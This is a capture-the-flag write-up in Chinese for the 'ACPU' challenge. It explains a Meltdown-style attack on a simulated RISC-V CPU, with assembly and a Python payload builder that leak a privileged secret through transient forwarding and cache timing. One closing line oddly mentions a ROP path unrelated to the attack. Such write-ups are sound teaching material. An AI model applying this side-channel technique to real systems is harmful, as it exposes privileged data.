# ACPU

## 题目简述

题目提供 RISC-V CPU 仿真器和内存镜像。表面上是权限检查题，`secret` 区域只有特权态可访问；真实漏洞是非法 `load` 的结果虽然不会架构态提交，却仍可通过 forwarding 影响后续公开内存访问，形成 Meltdown 型 cache/timing 侧信道。

## 解题过程

选手提交一段 base64 编码程序，服务端把机器码写入内存后启动 CPU 仿真，最后打印寄存器状态和执行周期。直接越权读取 secret 不会成功，例如：

```asm
addi x28, zero, 1
slli x28, x28, 31
lw x5, 0(x28)
```

最终寄存器里拿不到 secret，说明结果被权限检查 squash。继续看仿真波形可发现，用户态访问 `0x80000000 + off` 时会同时出现：

```text
secret_access = 1
illegal_load  = 1
mem_rdata     = secret word
```

非法读取不会写回寄存器，但后继指令没有立即阻断；如果依赖链排得足够紧，后续指令仍能通过 forwarding 消费这份瞬态数据。

cache 是小型 direct-mapped cache：

```text
LINE_BYTES   = 64
NUM_LINES    = 16
MISS_LATENCY = 4
```

因此可以把 secret 字节编码成 probe cache line。公共探针数组放在 `0x2000`，步长取一个 cache line：

```text
probe = 0x2000 + secret_byte * 0x40
```

瞬态访问序列：

```asm
addi x28, zero, 1
slli x28, x28, 31       # x28 = 0x80000000
lbu  x5, offset(x28)    # 非法读取 secret[offset]
lui  x30, 0x2           # x30 = 0x2000
slli x5, x5, 6
add  x5, x5, x30
lw   x6, 0(x5)          # 瞬态访问 probe[secret_byte]
add  x31, x6, zero
```

题目提供了读取 cycle 的自定义指令：

```asm
.word 0xc00002f3   # 读取当前 cycle 到 x5
.word 0xc00003f3   # 读取当前 cycle 到 x7
```

测量某个候选 probe 地址：

```asm
.word 0xc00002f3
lui  x29, ...
addi x29, x29, ...
lw   x6, 0(x29)
add  x31, x6, zero
.word 0xc00003f3
sub  x8, x7, x5
```

本地标定后，命中和未命中的周期差稳定：

```text
cache hit  -> 1805 cycles
cache miss -> 1808 cycles
```

因为 cache 只有 16 条 line，一次性测 256 个候选会互相驱逐。实际恢复时把候选分成 16 组，每组 16 个值；每组测完取最小 timing，再在全局选择最快的候选作为当前字节。

由于使用 `lbu`，每次直接读取 `offset` 处的一个字节，不需要再按 word 对齐或右移。利用 flag 格式 `ACTF{...}` 可以从偏移 0 开始恢复，读到 `}` 后停止。

核心请求脚本的逻辑如下：

```python
def probe_program(byte_offset, guess_base):
    lines = [
        ".option norvc",
        "addi x28, zero, 1",
        "slli x28, x28, 31",
        f"lbu x5, {byte_offset}(x28)",
        "lui x30, 0x2",
        "slli x5, x5, 6",
        "add x5, x5, x30",
        "lw x6, 0(x5)",
        "add x31, x6, zero",
    ]
    for slot, reg in enumerate(range(8, 24)):
        guess = guess_base + slot
        addr = 0x2000 + guess * 64
        hi = (addr + 0x800) >> 12
        lo = addr - (hi << 12)
        lines += [
            ".word 0xc00002f3",
            f"lui x29, 0x{hi:x}",
            f"addi x29, x29, {lo}",
            "lw x6, 0(x29)",
            "add x31, x6, zero",
            ".word 0xc00003f3",
            f"sub x{reg}, x7, x5",
        ]
    return base64.b64encode(asm("\n".join(lines))).decode()
```

最终逐字节恢复得到：

```text
ACTF{H4v3_y0u_h34rd_0f_m3ltd0wn?}
```

最终脚本连接远程服务并输出 flag，说明 rop/状态机路径可稳定触发。

## 方法总结

- 核心技巧：非法访问不提交寄存器，但瞬态值仍能影响 cache；通过 timing 区分 probe line 命中/未命中来恢复 secret。
- 识别信号：自制 CPU 中权限检查、流水线 forwarding、cache timing 同时存在时，应检查 Meltdown 型 transient execution。
- 复用要点：先验证直接读失败，再证明 timing oracle 稳定；direct-mapped cache 要分批测候选，避免 probe 自相驱逐。
